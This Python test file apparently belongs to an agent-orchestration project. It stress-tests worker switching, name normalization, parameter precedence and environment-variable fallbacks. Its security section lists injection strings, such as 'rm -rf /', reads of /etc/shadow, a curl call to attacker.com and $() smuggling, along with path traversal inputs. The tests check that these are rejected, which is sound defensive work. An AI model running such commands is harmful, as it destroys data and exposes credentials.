#!/usr/bin/env python3
"""
tests/test_adversarial_m2_worker_stress.py
Oppositional analysis and adversarial stress testing for Milestone 2:
Worker Switching & Delegation Stress Testing.

Covers all 5 Captain Directives:
1. Rapid worker switching across consecutive calls (agy, opencode, hermes, None, antigravity).
2. Worker name variations: uppercase, leading/trailing whitespace, alias normalization.
3. Security boundaries: injection, path traversal, unknown worker names.
4. Parameter precedence: worker over subagent, subagent fallback, default resolution.
5. Environment variable overrides: hierarchy, dirty whitespace, engine exclusions.
"""

import os
import sys
import json
import time
import asyncio
import unittest
from unittest.mock import patch, AsyncMock, MagicMock

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

import golem.config
import golem.config
import golem.execution
import golem.execution
from golem.execution.delegation import WorkerDelegator, sanitize_worker_output
from golem.execution.runner import ExecutionHandle, RunnerExecutor
import herdr_tools
import agent_core


# ===========================================================================
# 1. Rapid Worker Switching Across Consecutive Calls
# ===========================================================================
class TestAdversarialRapidWorkerSwitching(unittest.IsolatedAsyncioTestCase):
    """Stress tests rapid consecutive and concurrent switching between worker kinds."""

    def setUp(self):
        self.mock_client = AsyncMock()
        self.delegator = WorkerDelegator(
            herdr_client=self.mock_client,
            base_repo="/tmp/test_repo"
        )

    async def test_rapid_consecutive_worker_switching_delegator(self):
        """
        Rapidly alternates between 'agy', 'opencode', 'hermes', None, and 'antigravity'
        across 50 consecutive invocations to verify zero state leakage and correct routing.
        """
        worker_cycle = ["agy", "opencode", "hermes", None, "antigravity"]
        execution_log = []

        with patch("golem.execution.runner.RunnerExecutor.run_command") as mock_agy_run:
            mock_agy_run.return_value = ExecutionHandle(
                status="completed",
                pane="runner",
                command="echo test",
                returncode=0,
                stdout="AGY execution success",
                dispatched_at=time.time()
            )

            mock_wt_out = json.dumps({"result": {"worktree": {"path": "/tmp/wt/task-1"}}})

            for i in range(50):
                target_w = worker_cycle[i % len(worker_cycle)]

                # Reset client side effect for non-agy workers
                self.mock_client.run_cli.side_effect = [
                    (0, mock_wt_out, ""),              # worktree create
                    (0, "started", ""),                 # agent start
                    (0, "task accepted", ""),          # agent prompt
                    (0, "idle", ""),                   # agent wait
                    (0, f"Worker output turn {i}", ""),# agent read
                ]

                res = await self.delegator.handoff(
                    worker=target_w,
                    task=f"Task {i}",
                    cwd="/tmp/test_repo",
                    isolate_branch=True
                )

                execution_log.append({
                    "turn": i,
                    "input_worker": target_w,
                    "resolved_worker": res.get("worker"),
                    "status": res.get("status"),
                    "branch": res.get("branch")
                })

        self.assertEqual(len(execution_log), 50)
        for entry in execution_log:
            inp = entry["input_worker"]
            res_w = entry["resolved_worker"]
            self.assertEqual(entry["status"], "completed")

            if inp in ("agy", None, "antigravity"):
                self.assertEqual(res_w, "agy", f"Turn {entry['turn']}: expected agy, got {res_w}")
                self.assertEqual(entry["branch"], "main")
            elif inp == "opencode":
                self.assertEqual(res_w, "opencode", f"Turn {entry['turn']}: expected opencode, got {res_w}")
                self.assertTrue(entry["branch"].endswith("-opencode"))
            elif inp == "hermes":
                self.assertEqual(res_w, "hermes", f"Turn {entry['turn']}: expected hermes, got {res_w}")
                self.assertTrue(entry["branch"].endswith("-hermes"))

    async def test_concurrent_worker_switching_isolation(self):
        """
        Executes 25 concurrent worker handoffs across distinct worker types
        simultaneously to stress-test concurrency without cross-worker collision.
        """
        workers = ["agy", "opencode", "hermes", None, "antigravity"] * 5

        async def run_single_worker(idx: int, w: str):
            mock_client = AsyncMock()
            mock_wt_out = json.dumps({"result": {"worktree": {"path": f"/tmp/wt/task-{idx}"}}})
            mock_client.run_cli.side_effect = [
                (0, mock_wt_out, ""),
                (0, "started", ""),
                (0, "task accepted", ""),
                (0, "idle", ""),
                (0, f"Finished task {idx} for {w}", ""),
            ]

            delegator = WorkerDelegator(herdr_client=mock_client, base_repo="/tmp/test_repo")

            with patch("golem.execution.runner.RunnerExecutor.run_command") as mock_agy_run:
                mock_agy_run.return_value = ExecutionHandle(
                    status="completed",
                    pane="runner",
                    command=f"echo {idx}",
                    returncode=0,
                    stdout=f"AGY task {idx} done",
                    dispatched_at=time.time()
                )
                return await delegator.handoff(worker=w, task=f"Concurrent task {idx}")

        start_time = time.time()
        results = await asyncio.gather(*[run_single_worker(i, w) for i, w in enumerate(workers)])
        duration = time.time() - start_time

        self.assertEqual(len(results), 25)
        self.assertLess(duration, 5.0, "Concurrent handoffs must complete without hanging")

        for i, (res, w) in enumerate(zip(results, workers)):
            self.assertEqual(res["status"], "completed")
            expected_worker = "agy" if w in ("agy", None, "antigravity") else w
            self.assertEqual(res["worker"], expected_worker, f"Worker index {i} mismatch: got {res['worker']}")


# ===========================================================================
# 2. Worker Name Variations & Normalization
# ===========================================================================
class TestAdversarialWorkerNameVariations(unittest.TestCase):
    """Adversarial testing of casing, leading/trailing whitespace, and alias normalization."""

    def test_delegator_normalize_worker_casing(self):
        """WorkerDelegator.normalize_worker_name handles all casing combinations."""
        cases = [
            ("AGY", "agy"),
            ("Agy", "agy"),
            ("aGY", "agy"),
            ("OPENCODE", "opencode"),
            ("OpenCode", "opencode"),
            ("opencode", "opencode"),
            ("HERMES", "hermes"),
            ("Hermes", "hermes"),
            ("ANTIGRAVITY", "agy"),
            ("AntiGravity", "agy"),
            ("antiGRAVITY", "agy"),
        ]
        for inp, expected in cases:
            norm = WorkerDelegator.normalize_worker_name(inp)
            self.assertEqual(norm, expected, f"Failed normalizing '{inp}' -> expected '{expected}', got '{norm}'")

    def test_delegator_normalize_worker_whitespace(self):
        """WorkerDelegator.normalize_worker_name strips leading and trailing whitespace."""
        cases = [
            ("  agy  ", "agy"),
            ("\topencode\n", "opencode"),
            ("   hermes   ", "hermes"),
            (" \t\n antigravity \n\t ", "agy"),
            ("  AGY  ", "agy"),
            ("  OPENCODE  ", "opencode"),
            ("  HERMES  ", "hermes"),
        ]
        for inp, expected in cases:
            norm = WorkerDelegator.normalize_worker_name(inp)
            self.assertEqual(norm, expected, f"Failed whitespace normalization on '{inp!r}'")

    def test_delegator_validate_worker_accepts_variations(self):
        """validate_worker accepts valid variations with whitespace and uppercase."""
        for inp in ["  AGY  ", " OpenCode ", "  hermes  ", "ANTIGRAVITY"]:
            norm = WorkerDelegator.validate_worker(inp)
            self.assertIn(norm, ["agy", "opencode", "hermes"])

    def test_config_antigravity_alias_standardization(self):
        """get_default_hand_worker() standardizes 'antigravity' to 'agy' across all env vars."""
        with patch.object(golem.config, "_get_file_env", return_value={}):
            for var in ["GOLEM_DEFAULT_HAND_WORKER", "FIRSTMATE_DEFAULT_HAND_WORKER", "FIRST_MATE_DEFAULT_HAND_WORKER"]:
                with patch.dict(os.environ, {var: "antigravity"}, clear=True):
                    self.assertEqual(golem.config.get_default_hand_worker(), "agy")
                with patch.dict(os.environ, {var: "  ANTIGRAVITY  "}, clear=True):
                    self.assertEqual(golem.config.get_default_hand_worker(), "agy")


# ===========================================================================
# 3. Security Boundaries: Injection, Traversal, Unknown Workers
# ===========================================================================
class TestAdversarialSecurityBoundaries(unittest.IsolatedAsyncioTestCase):
    """
    Stress-tests security boundaries against malicious worker strings:
    - Command injection with semicolons, pipes, backticks, $()
    - Path traversal attempts (../../etc/passwd)
    - Unknown or rogue worker names
    """

    def setUp(self):
        self.mock_client = AsyncMock()
        self.delegator = WorkerDelegator(
            herdr_client=self.mock_client,
            base_repo="/tmp/test_repo"
        )
        self.malicious_strings = [
            "agy; rm -rf /",
            "../../etc/passwd",
            "opencode && whoami",
            "unknown_worker",
            "`id`",
            "$(whoami)",
            "agy | cat /etc/shadow",
            "opencode; curl http://attacker.com",
            "/bin/bash",
            r"..\..\windows\system32",
            "agy\nrm -rf /",
        ]

    def test_delegator_validate_worker_rejects_all_malicious_inputs(self):
        """WorkerDelegator.validate_worker immediately rejects all malicious strings with ValueError."""
        for bad_worker in self.malicious_strings:
            with self.assertRaises(ValueError, msg=f"validate_worker failed to reject: {bad_worker!r}"):
                WorkerDelegator.validate_worker(bad_worker)

    async def test_delegator_handoff_rejects_all_malicious_inputs(self):
        """WorkerDelegator.handoff safely raises ValueError when given malicious worker inputs."""
        for bad_worker in self.malicious_strings:
            with self.assertRaises(ValueError, msg=f"delegator.handoff failed to reject: {bad_worker!r}"):
                await self.delegator.handoff(worker=bad_worker, task="safe task")

    async def test_golem_execution_herdr_handoff_facade_rejects_malicious_inputs(self):
        """golem.execution.herdr_handoff facade safely rejects malicious inputs."""
        for bad_worker in self.malicious_strings:
            with self.assertRaises(ValueError, msg=f"golem.execution.herdr_handoff accepted: {bad_worker!r}"):
                await golem.execution.herdr_handoff(worker=bad_worker, task="safe task")


# ===========================================================================
# 4. Parameter Precedence Tests
# ===========================================================================
class TestAdversarialParameterPrecedence(unittest.IsolatedAsyncioTestCase):
    """
    Tests exact precedence rules:
    - herdr_handoff(worker='opencode', subagent='hermes') -> selects 'opencode'
    - herdr_handoff(subagent='opencode', worker=None) -> selects 'opencode'
    - herdr_handoff() (omitting both) -> selects 'agy'
    """

    def setUp(self):
        self.orig_env = os.environ.copy()
        os.environ.pop("GOLEM_DEFAULT_HAND_WORKER", None)
        os.environ.pop("FIRSTMATE_DEFAULT_HAND_WORKER", None)
        os.environ.pop("FIRST_MATE_DEFAULT_HAND_WORKER", None)

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self.orig_env)

    async def test_herdr_tools_handoff_precedence(self):
        """herdr_tools.herdr_handoff precedence: worker > subagent > default(agy)."""
        with patch("herdr_tools.herdr_spawn", new_callable=AsyncMock) as mock_spawn:
            mock_spawn.return_value = {"worker": "ok", "pane_id": "w1:p1"}

            # Case 1: worker='opencode', subagent='hermes' -> selects 'opencode'
            await herdr_tools.herdr_handoff(worker="opencode", subagent="hermes", task="test")
            self.assertEqual(mock_spawn.call_args[1]["worker"], "opencode")
            mock_spawn.reset_mock()

            # Case 2: subagent='opencode', worker=None -> selects 'opencode'
            await herdr_tools.herdr_handoff(worker=None, subagent="opencode", task="test")
            self.assertEqual(mock_spawn.call_args[1]["worker"], "opencode")
            mock_spawn.reset_mock()

            # Case 3: omit both -> selects 'agy'
            await herdr_tools.herdr_handoff(task="test")
            self.assertEqual(mock_spawn.call_args[1]["worker"], "agy")
            mock_spawn.reset_mock()

            # Case 4: worker='agy', subagent='opencode' -> selects 'agy'
            await herdr_tools.herdr_handoff(worker="agy", subagent="opencode", task="test")
            self.assertEqual(mock_spawn.call_args[1]["worker"], "agy")
            mock_spawn.reset_mock()

    async def test_worker_delegator_precedence(self):
        """WorkerDelegator.handoff precedence: worker > subagent > default(agy)."""
        mock_client = AsyncMock()
        mock_wt_out = json.dumps({"result": {"worktree": {"path": "/tmp/wt"}}})
        mock_client.run_cli.side_effect = [
            (0, mock_wt_out, ""),
            (0, "started", ""),
            (0, "prompted", ""),
            (0, "idle", ""),
            (0, "output", ""),
        ]

        delegator = WorkerDelegator(herdr_client=mock_client, base_repo="/tmp")

        # Case 1: worker='opencode', subagent='hermes' -> selects 'opencode'
        res1 = await delegator.handoff(worker="opencode", subagent="hermes", task="test")
        self.assertEqual(res1["worker"], "opencode")

        # Case 2: subagent='opencode', worker=None -> selects 'opencode'
        mock_client.run_cli.side_effect = [
            (0, mock_wt_out, ""),
            (0, "started", ""),
            (0, "prompted", ""),
            (0, "idle", ""),
            (0, "output", ""),
        ]
        res2 = await delegator.handoff(worker=None, subagent="opencode", task="test")
        self.assertEqual(res2["worker"], "opencode")

        # Case 3: omit both -> selects 'agy'
        with patch("golem.execution.runner.RunnerExecutor.run_command") as mock_run:
            mock_run.return_value = ExecutionHandle(status="completed", pane="runner", command="test", stdout="done")
            res3 = await delegator.handoff(task="test")
            self.assertEqual(res3["worker"], "agy")


# ===========================================================================
# 5. Environment Variable Overrides & Cascade Integrity
# ===========================================================================
class TestAdversarialEnvVarOverrides(unittest.TestCase):
    """
    Stress-tests environment variable resolution hierarchy, dirty whitespace,
    empty strings, and engine exclusion filters.
    """

    def setUp(self):
        self.orig_env = os.environ.copy()

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self.orig_env)

    def test_dirty_whitespace_variations(self):
        """Whitespace-only strings must not be accepted and must fall through."""
        with patch.object(golem.config, "_get_file_env", return_value={}):
            # Only spaces in GOLEM var -> falls back to agy
            with patch.dict(os.environ, {"GOLEM_DEFAULT_HAND_WORKER": "   \t\n  "}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "agy")

            # Spaces in GOLEM var, valid FIRSTMATE var -> falls through to FIRSTMATE
            with patch.dict(os.environ, {
                "GOLEM_DEFAULT_HAND_WORKER": "  \t  ",
                "FIRSTMATE_DEFAULT_HAND_WORKER": "opencode"
            }, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "opencode")

            # Spaces in both -> falls through to FIRST_MATE_DEFAULT_HAND_WORKER
            with patch.dict(os.environ, {
                "GOLEM_DEFAULT_HAND_WORKER": " ",
                "FIRSTMATE_DEFAULT_HAND_WORKER": "   \n\t",
                "FIRST_MATE_DEFAULT_HAND_WORKER": "hermes"
            }, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "hermes")

    def test_engine_variables_do_not_override_to_claude_code(self):
        """
        Conversational engine drivers (claude_code, claude) must NEVER be used
        as hand worker default. Must safely fall back to 'agy'.
        """
        with patch.object(golem.config, "_get_file_env", return_value={}):
            # FIRST_MATE_ENGINE="claude_code"
            with patch.dict(os.environ, {"FIRST_MATE_ENGINE": "claude_code"}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "agy")

            # GOLEM_ENGINE="claude_code"
            with patch.dict(os.environ, {"GOLEM_ENGINE": "claude_code"}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "agy")

            # FIRST_MATE_ENGINE="claude"
            with patch.dict(os.environ, {"FIRST_MATE_ENGINE": "claude"}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "agy")

            # GOLEM_ENGINE="claude"
            with patch.dict(os.environ, {"GOLEM_ENGINE": "claude"}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "agy")

            # Mixed casing and whitespace: "  Claude_Code  "
            with patch.dict(os.environ, {"FIRST_MATE_ENGINE": "  Claude_Code  "}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "agy")

    def test_legitimate_engine_hand_fallback(self):
        """Legitimate hand engine drivers (opencode, hermes) when no hand worker set are used."""
        with patch.object(golem.config, "_get_file_env", return_value={}):
            with patch.dict(os.environ, {"FIRST_MATE_ENGINE": "opencode"}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "opencode")

            with patch.dict(os.environ, {"FIRST_MATE_ENGINE": "hermes"}, clear=True):
                self.assertEqual(golem.config.get_default_hand_worker(), "hermes")

    def test_shim_parity_first_mate_config(self):
        """Verifies golem.config exports identical behavior under all adversarial conditions."""
        with patch.object(golem.config, "_get_file_env", return_value={}):
            with patch.object(golem.config, "_get_file_env", return_value={}):
                # Claude code exclusion
                with patch.dict(os.environ, {"FIRST_MATE_ENGINE": "claude_code"}, clear=True):
                    self.assertEqual(golem.config.get_default_hand_worker(), "agy")
                    self.assertEqual(golem.config.get_default_hand_worker(), golem.config.get_default_hand_worker())

                # Hierarchy resolution
                with patch.dict(os.environ, {"GOLEM_DEFAULT_HAND_WORKER": "opencode"}, clear=True):
                    self.assertEqual(golem.config.get_default_hand_worker(), "opencode")
                    self.assertEqual(golem.config.get_default_hand_worker(), golem.config.get_default_hand_worker())


# ===========================================================================
# 6. Empirical Vulnerability & Defect Reproduction Tests
# ===========================================================================
class TestEmpiricalDefectReproduction(unittest.IsolatedAsyncioTestCase):
    """
    Verifies resolution of empirical vulnerabilities identified during red-team challenge:
    1. herdr_tools.herdr_handoff rejects injection strings with ValueError.
    2. herdr_tools.herdr_handoff rejects path traversal strings with ValueError.
    3. herdr_tools.herdr_handoff normalizes 'antigravity' alias to 'agy'.
    4. agent_core.ChiefOfStaff defaults to 'agy' via get_default_hand_worker() when omitted.
    """

    async def test_reproduce_herdr_tools_injection_acceptance(self):
        """
        REMEDIATED DEFECT 1:
        herdr_tools.herdr_handoff rejects dangerous shell injection strings with ValueError.
        """
        bad_worker = "agy; rm -rf /"
        with self.assertRaises(ValueError):
            await herdr_tools.herdr_handoff(worker=bad_worker, cwd="/tmp")

    async def test_reproduce_herdr_tools_traversal_acceptance(self):
        """
        REMEDIATED DEFECT 2:
        herdr_tools.herdr_handoff rejects path traversal strings with ValueError.
        """
        traversal_worker = "../../etc/passwd"
        with self.assertRaises(ValueError):
            await herdr_tools.herdr_handoff(worker=traversal_worker, cwd="/tmp")

    async def test_reproduce_herdr_tools_antigravity_alias_non_normalization(self):
        """
        REMEDIATED DEFECT 3:
        herdr_tools.herdr_handoff normalizes 'antigravity' to 'agy'.
        """
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_proc = AsyncMock()
            mock_proc.returncode = 0
            mock_proc.communicate.return_value = (b"Spawned w1:p1\n", b"")
            mock_exec.return_value = mock_proc

            res = await herdr_tools.herdr_handoff(worker="antigravity", cwd="/tmp")
            self.assertEqual(res.get("worker"), "agy", "herdr_tools must normalize 'antigravity' to 'agy'")

    async def test_reproduce_agent_core_opencode_hardcoded_default(self):
        """
        REMEDIATED DEFECT 4:
        agent_core.ChiefOfStaff.execute_tool_call defaults to 'agy' via get_default_hand_worker()
        when worker or subagent is omitted.
        """
        cos = agent_core.ChiefOfStaff()
        with patch("herdr_tools.herdr_handoff", new_callable=AsyncMock) as mock_handoff:
            mock_handoff.return_value = {"worker": "ok"}
            # Call herdr_handoff without specifying worker or subagent
            await cos.execute_tool_call("herdr_handoff", {"task": "inspect status"})

            call_kwargs = mock_handoff.call_args[1]
            dispatched_subagent = call_kwargs.get("subagent")
            self.assertEqual(dispatched_subagent, "agy", "agent_core must default to 'agy'")


if __name__ == "__main__":
    unittest.main()
